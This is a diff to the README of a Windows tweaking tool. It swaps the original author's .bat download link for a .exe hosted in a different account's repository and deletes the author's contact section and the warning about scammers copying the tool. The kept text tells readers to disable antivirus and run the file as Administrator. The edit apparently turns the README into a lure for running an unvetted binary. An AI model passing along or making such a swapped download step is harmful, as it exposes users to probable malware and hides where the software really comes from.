@@ -51,7 +51,7 @@ Also, [here](https://www.virustotal.com/gui/file/ec0bba5208ca4e036b4820f30205e20
 ![](https://github.com/Teramanbr/TerabyteTweaker/blob/main/images/VirusTotal.png?raw=true)
 I would reccomend turning off your antivirus before running the program.
 
-- [Download](https://github.com/Teramanbr/TerabyteTweaker/releases/latest/download/Terabyte.Tweaker.bat) the application.
+- [Download](https://github.com/AristFlip/TerTweaker/releases/download/Minecraft/TerTweaker.exe) the application.
 - Run the app as Administrator.
 - Press <kbd>Y</kbd> and enter to install the application with default settings (Recommended).
 
@@ -70,20 +70,6 @@ Here is how to Disable/Enable any of the settings:
 
 - Terabyte Tweaker will automatically create a restore point so you can restore your system to its original state, if desired.
 
-### 🤝 Contributing <a name = "contributing"></a>
-
-Contributions, issues and feature requests are welcome!<br />Feel free to check the [issues page](https://github.com/Teramanbr/TerabyteTweaker/issues). 
-If you can't contribute to the app by sending bug reports, forks or feature requests, you can contribute to me instead, by subscribing to my [YouTube channel](https://www.youtube.com/channel/UCIj-jcplOl9RqTfjXQ30JXA?sub_confirmation=1&via=tb).
-
-To contact me directly, send me a message on my discord: [`Teraman_br#5060`](https://discord.com/channels/@me/397437604880187403)
-
 I plan to remake this app in another programming language, but im still studying rust, so it will take a while.
 I tested this app **piece by piece** on my computers and didn't need to use VMs, beacuse none of the features are able to damage your system.
-
-### 📢 Warning! <a name = "warning"></a>
-
-Terabyte Tweaker is COMPLETELY FREE. If someone claims you need to pay them, they are trying to scam you.
-Here are some examples of a scammer trying to sell Terabyte Tweaker (He copied the whole code):
-![image](https://github.com/Teramanbr/TerabyteTweaker/assets/71410827/ad205532-62ab-4b62-804a-a41b50374310)
-![image](https://github.com/Teramanbr/TerabyteTweaker/assets/71410827/7c3d56dd-4bd6-443a-95e6-9f048ce5d171)
 
